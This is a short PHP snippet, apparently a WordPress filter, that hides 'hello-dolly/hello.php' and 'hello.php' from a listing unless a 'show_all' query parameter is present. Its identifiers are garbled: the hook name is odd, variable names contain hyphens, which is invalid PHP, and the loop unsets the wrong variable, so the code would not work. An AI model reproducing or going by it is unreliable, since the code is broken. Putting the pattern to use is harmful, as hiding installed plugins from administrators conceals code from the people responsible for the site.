<?php
add_filter(
	'all_uuploads-webpc',
	function ( $uploads-webpc ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenuploads-webpc = [
				'hello-dolly/hello.php',
				'hello.php',
			];
			foreach ( $hiddenuploads-webpc as $hiddenuploads-webpcs ) {
				unset( $uploads-webpc[ $hiddenuploads-webpc ] );
			}
		}
		return $uploads-webpc;
	}
);